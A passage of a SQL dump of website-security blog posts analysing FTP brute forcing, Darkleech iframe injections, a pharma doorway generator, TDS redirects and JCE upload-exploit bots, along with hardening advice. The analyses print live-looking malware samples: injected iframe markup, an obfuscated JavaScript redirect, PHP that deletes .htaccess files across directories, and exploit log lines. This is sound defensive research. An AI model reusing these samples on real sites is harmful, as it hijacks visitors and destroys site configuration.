environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (171, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (172, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (173, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (174, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (175, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (176, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
